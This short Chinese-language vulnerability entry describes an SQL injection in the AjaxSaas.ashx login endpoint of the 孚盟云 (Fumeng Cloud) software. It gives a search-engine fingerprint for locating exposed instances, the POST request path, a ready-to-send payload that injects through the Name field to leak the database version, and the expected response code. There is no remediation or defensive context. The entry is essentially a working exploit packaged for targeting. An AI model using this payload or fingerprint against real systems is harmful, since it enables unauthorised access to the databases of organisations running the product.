# 孚盟云AjaxSaas.ashx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /Ajax/AjaxSaas.ashx HTTP/1.1`

**Payload**
```
action=Login&Name=2'+and+1=@@version--+&pwd=1&validateCode=&checkValidateCode=0
```
- **响应特征**：200